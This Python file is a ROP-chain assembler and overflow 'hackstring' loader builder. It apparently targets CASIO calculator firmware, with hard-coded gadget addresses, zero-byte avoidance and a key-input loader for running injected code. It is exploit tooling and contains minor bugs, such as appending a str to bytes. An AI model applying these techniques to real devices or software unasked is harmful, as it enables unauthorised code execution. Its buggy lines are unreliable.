from collections import namedtuple
from typing import *
import argparse
import struct


Relocation = namedtuple('Relocation', 'addr label')


class Assembler:
    """
    This is the ROP "assembler", it converts our higher level operations 
    into ROP based operations
    """

    def __init__(self, from_overflow=False) -> None:
        """
        Create a new rop assembler, if from_overflow is True then 
        the rop will limit itself to only things possible to do 
        inside an overflow rop
        """
        self._stack = bytes()
        self._labels = {}
        self._relocations: List[Relocation] = []
        self._from_overflow = from_overflow
        
        self._has_link = False

    ######################################################################
    # Label management
    ######################################################################

    def create_label(self) -> str:
        """
        Create a new label, don't place it anywhere
        """
        lbl = f'l{len(self._labels)}'
        self._labels[lbl] = None
        return lbl

    def place_label(self, lbl: str):
        """
        Place the given label at the current position
        """
        assert self._labels[lbl] is None, "Tried to place the same label twice!"
        self._labels[lbl] = len(self._stack)

    def label(self):
        """
        Create and place the label at the current position
        """
        lbl = self.create_label()
        self.place_label(lbl)
        return lbl

    ######################################################################
    # Push value to call stack
    # The reason these are big endian is because of how the output is 
    # copied to the stack  
    ######################################################################

    def push8(self, val: int):
        self._stack = struct.pack('>B' if val >= 0 else '>b', val) + self._stack

    def push16(self, val: int):
        self._stack = struct.pack('>H' if val >= 0 else '>h', val) + self._stack

    def push32(self, val: int):
        self._stack = struct.pack('>I' if val >= 0 else '>i', val) + self._stack

    def push64(self, val: int):
        self._stack = struct.pack('>Q' if val >= 0 else '>q', val) + self._stack

    def push_lbl(self, val: str):
        """
        push an address of a label
        """
        self._relocations.append(Relocation(len(self._stack), val))
        self.push16(0x3030)

    def push_addr(self, val: int or str):
        """
        Push an address to the stack, and fix it so it will fit 
        properly in the hackstring
        """
        self.push32(self.fix_address(val))

    def fix_address(self, addr):
        """
        the full address is made of:

        16            0
        +-------------+
        |     PC      |
        +-------------+
        |  0   | LCSR |
        +-------------+

        Even more, specifically on the CASIO calculators, the LCSR is just one bit.

        Now because we can't actually have zeros in our code (can't enter them in the 
        calculator) we are going to pad it with 0x30 (TODO: which char is that?), and as 
        we said because the calculator only uses the first bit of the LCSR we can do it 
        without making the calculator jump elsewhere 

        As for the lower byte of PC, we need to make sure it is not so it can be entered by
        the overflow method, to do so we can just set the first bit, which the CPU ignores 
        nicely.
        """
        assert addr <= 0x1FFFF, f"Can't jump to this adddress ({hex(addr)})"

        if self._from_overflow:
            # we can't have zero bytes
            assert addr >= 0x1000, f"Can't jump to this adddress ({hex(addr)})"

            if addr & 0xFF == 0:
                # Negate the zero
                addr |= 1
            else:
                # TODO: Optimize the address for less presses 
                #       by trying both with and without lower 
                #       bit set
                pass
        
            # Pad the address to not have zeroes for the upper 
            # 16 bits
            addr = 0x30300000 | addr
        
        return addr

    ######################################################################
    # Higher level primitives
    ######################################################################


    # These are gadgets to set different registers
    # We also keep gadgets that set a register to a certain value
    # which can be helpful to make the code smaller
    SET_REG_GADGETS = {
        'R0': (
            0x173bc, # POP R0
            push8,
            {
                0: 0x1ae3c, # MOV R0, #0
                1: 0x1a3da, # MOV R0, #1
                2: 0x14de2, # MOV R0, #2
                3: 0x1a740, # MOV R0, #3
                4: 0x17488, # MOV R0, #4
            },
        ),
        'R1': (
            None,    # No `POP R1`
            None,
            {
                0: 0x15336, # MOV R1, #0
            }
        ),
        'ER0': (
            0x3526, # POP ER0,
            push16,
            {}
        ),
        'ER2': (
            0x44b2, # POP ER2
            push16,
            {}
        ),
        'ER12': (
            0x3a6a, # POP ER12
            push16,
            {}
        )
    }

    def set_lr(self):
        """
        Sets the LR and LCSR registers so we can use gadgets that require 
        the link register

        TODO: automatic

        overwrites ER12
        """
        assert not self._has_link, "Already set link register"

        # we don't have the link setup yet, we need to set
        # it nicely

        # Set ER12 to the next address
        self.push_addr(self.SET_REG_GADGETS['ER12'][0])

        # we need to use a trampoline, and this is perfect 
        # to be used as a trampoline, only need the address
        # since `BL ERn` works on the same CSR
        self.SET_REG_GADGETS['ER12'][1](self, 0x11D92 & 0xFFFF)

        # Jump to it with the link register being set
        # 11D90                 BL      ER12
        # 11D92                 POP     PC
        self.push_addr(0x11D90)

        self._has_link = True

    def set_reg(self, reg: str, value: int):
        """
        Use gadgets to set a register to a certain value
        """

        # Get the table
        assert reg in self.SET_REG_GADGETS, f"No gadget to set register {reg}"
        table = self.SET_REG_GADGETS[reg]

        # TODO: we should track register states
        #       so we know when to not emit a set 
        #       reg

        # Check if we can set it from a constant
        if table[2] is not None and value in table[2]:
            # We can!
            self.push_addr(table[2][value])
        else:
            # We can't, must use a POP
            assert table[0] is not None, f"No gadget to set register {reg}"
            self.push_addr(table[0])
            table[1](self, value)

    def r0_as_bool(self):
        """
        Truncates R0 to a "bool"
        * if it has value set it to 1
        * if it has no value set it to 0

        because R1 is zeroed out in this you can use ER0 directly
        if need be
        """
        assert self._has_link, "This gadget requires a link register"

        # For this gadget to work we need
        # this to be zero
        self.set_reg('R1', 0)

        # 8ac4                 CMP R1, R0
        # 8ac6                 SUBC R0, R0
        # 8ac8                 NEG R0
        # 8aca                 RT 
        self.push_addr(0x8ac4)

    def _st_relative_er2(self, offset):
        """
        Set a value relative to the SP of after this instruction

        overwrites ER0
        """
        assert self._has_link, "This gadget requires a link register"

        # TODO: replace with ER4 and ER0 for better correctness 

        # Load R4 to have the value we want to add to R0
        # 15EE0                 POP     R4
        # 15EE2                 POP     PC
        self.push_addr(0x15EE0)
        self.push8(9 + offset)

        # We are going to get the current stack position so we 
        # can modify it to point to the 
        # 4588                 MOV ER0, SP
        # 458a                 RT 
        self.push_addr(0x4588)

        # now we need to add to ER0 the offset so the value after 
        # the store is the address that will be poped, we need to 
        # add 9 (addition value (1) + ADD address (4) + ST address (4) + offset)
        # 174e0                 ADD R0, R4
        # 174e2                 RT 
        self.push_addr(0x174e0)

        # Now we can set the value to where the next pop will be, 
        # so the next pop is going to be to the indirect address
        # 132f2                 ST ER2, [ER0]
        # 132f4                 RT 
        self.push_addr(0x132f2)

    def goto_indirect_er2(self):
        """
        Will set the stack pointer to a value which is in er2, this basically 
        allows to do an indirect jump

        overwrites ER0 and ER14
        """

        # Modify the value for the next pop with the value which
        # is currently inside er2
        self._st_relative_er2(4)

        # 2c72                 POP ER14
        # 2c74                 POP PC
        self.push_addr(0x2c72)
        self.push16(0x3030)

        # 2c70                 MOV SP, ER14
        # 2c72                 POP ER14
        # 2c74                 POP PC
        self.push_addr(0x2c70)
        self.push16(0x3030)
    
    def goto(self, lbl: str):
        """
        Allows to jump to a label in the code

        TODO: we can probably better optimize this, making so the next label we going to jump
              to will already have the address we want making so for the next gadgets we only 
              need a single gadget
        """
        # 2c72                 POP ER14
        # 2c74                 POP PC
        self.push_addr(0x2c72)
        self.push_lbl(lbl)

        # 2c70                 MOV SP, ER14
        # 2c72                 POP ER14
        # 2c74                 POP PC
        self.push_addr(0x2c70)
        self.push16(0x3030)

    def deref_er0_to_r2(self):
        """
        Deref the address in er0 into r2
        """
        # 276a                 ST R2, [ER0]
        # 276c                 POP PC
        self.push_addr(0x276a) 
    
    def load_word_from_er2(self, table):
        """
        This will index into ER2 with the value in ER0 treating
        ER2 as an array of words

        overwrites R2
        """
        assert self._has_link, "This gadget requires a link register"

        # This gadget is perfect since it does everything we need:
        #   ER0 = POKE16(<condition> * 2 + <offset>)
        # 134b4                 ADD ER0, ER0
        # 134b6                 ADD ER2, ER0
        # 134b8                 L ER0, [ER2]
        # 134ba                 MOV R2, #9
        # 134bc                 RT 
        self.push_addr(0x134b4)

    def brk(self):
        """
        Just break
        """
        self.push_addr(0xffc2)

    MOV_GADGETS = {
        # POP PC 
        ('R2', 'R0'): 0x3de2,
        ('ER0', 'ER8'): 0x1417e,
        ('ER2', 'ER12'): 0x1399e,
        ('ER8', 'ER0'): 0x1468c,

        # RT 
        ('ER0', 'ER2'): 0x87fc,
        ('ER10', 'ER0'): 0x13e5c,
        ('ER10', 'ERER20'): 0x13230,
    }

    def mov(self, dst, src):
        """
        Move the register around
        """
        assert (dst, src) in self.MOV_GADGETS, f"Can't move {src} to {dst}"
        self.push_addr(self.MOV_GADGETS[(dst, src)])        

    def set_ea_er12(self):
        """
        Set the EA register to a certain value

        This is not a perfect gadget and will overwrite 10 bytes before the 
        real value, so either make sure the first 10 regs have a valid value, or 
        don't care about the 10 bytes before the value
        """
        assert self._has_link, "This gadget requires a link register"

        # As the comment says this is nice but not that much because 
        # we override 10 bytes
        # 16058                 LEA [ER12]
        # 1605a                 ST QR0, [EA+]
        # 1605c                 ST ER8, [EA+]
        # 1605e                 RT 
        self.push_addr(0x16058)

    def relocate(self, sp):
        """
        Relocate everything to run from the given sp
        """
        tmp = bytearray(self._stack)
        for rel in self._relocations:
            assert rel.label in self._labels and self._labels[rel.label] is not None, f"Undefined label `{rel.label}`"
            struct.pack_into('<H', tmp, rel.addr, self._labels[rel.label] + sp)
        self._stack = bytes(tmp)

    def pack_overflow(self, sp, inbuf_addr):
        """
        Pack the code in the assembler to run from the overflow exploit.

        The sp is going to be where the first pop is going to be made (start of the rop).

        The inbuf is going to be where the input buffer of the calculator is, it is going to allow us 
        to align the code nicely so it will end up at the needed sp.
        """
        assert len(self._stack) <= 100, "ROP is too large to fit in the overflow exploit..."

        # First we need to relocate it properly 
        self.relocate(sp)

        # Align this to 100 bytes exactly
        self._stack += b'\x30' * (100 - len(self._stack))

        # The way we are going to align the hackstring to fit exactly on the stack is with this 
        # simple calculation, if you remember, we are going to fill the ram with a 100 byte pattern 
        # starting at the input buffer. So in order to figure the shift of the hackstring we need to make 
        # so the pattern will start where the SP is currently at we need to just subtract them and mod by 100
        # then just shift by that amount
        shift = (sp - inbuf_addr) % 100
        
        # Now return it rotated
        return self._stack[shift:] + self._stack[:shift], shift

def build_loader(program: Assembler, sp: int = 0x8CDC):
    """
    This is going to build a loader that can be used to load
    more code nicely

    Note, this is not really where the stack is at, the stack is really at 0x8DA4, but we moved 
    the initial stack so we can have it in the loader script without a problem (0x8D can't be entered 
    but 0x8CDC can be entered)
    """
    asm = Assembler(True)

    # symbols we are going to use 
    getkeycode = 0xB45E

    # Calculate the starting of the program
    program_len = len(program._stack)
    
    # Align the program to 2 byte boundary so the overriding
    # will work nicely and as expected
    if program_len % 2 != 0:
        program._stack += '\x00'
        program_len += 1

    # this is going to be the start of our program
    # TODO: verify the address is good and realign if we need more space
    #       to make the address good
    program_start = sp - program_len

    # once we have it we can relocate the program
    program.relocate(program_start)

    # Now build the actual loader and return it packed and ready for input 
    asm.set_lr()
    asm.set_reg('ER12', program_start)
    asm.set_ea_er12()

    loop_get_key = asm.label()

    # Do two bytes so we can override the loader afterwards
    for _ in range(2):    
        asm.push_addr(getkeycode)
        asm.push_addr(0x2ab6) # AND R0, #15
        asm.mov('R2', 'R0')

        asm.push_addr(getkeycode)
        asm.push_addr(0x2abe) # AND R1, #15, SLL R0, #4, OR R1, R0, ST R1, 08100h

        asm.push_addr(0x16cec) # ADD ER0, ER2

        asm.mov('R2', 'R0')
        asm.push_addr(0x1a3f8) # ST R2, [EA+]

    offset = len(asm._stack)
    asm.goto(loop_get_key)

    # Pack the loader for the overflow, this will 
    # also do relocations
    packed_loader, shift = asm.pack_overflow(sp, 0x8154)
    dummy_loader = bytearray(packed_loader)

    # now build another version of the loader just that this time it will 
    # jump to the shellcode at the end instead of the loop
    #
    # we get the offset to the goto gadget and we modify the address
    # we are going to pop from the stack, so skip the first gadget 
    # and set the poped value
    dummy_loader[(shift + offset + 4 + 0) % 100] = program_start & 0xFF
    dummy_loader[(shift + offset + 4 + 1) % 100] = (program_start >> 8) & 0xFF

    return packed_loader, bytes(dummy_loader)[(shift + offset + 4 + 2) % 100:]

if __name__ == '__main__':

    # Some cool program 
    asm = Assembler()
    asm.brk()

    # build the loader for our program
    loader, dummy_loader = build_loader(asm)

    print("Loader")
    print(bytes.hex(loader))

    print("Program")
    print(bytes.hex(asm._stack))

    print("Trigger")
    print(bytes.hex(dummy_loader))
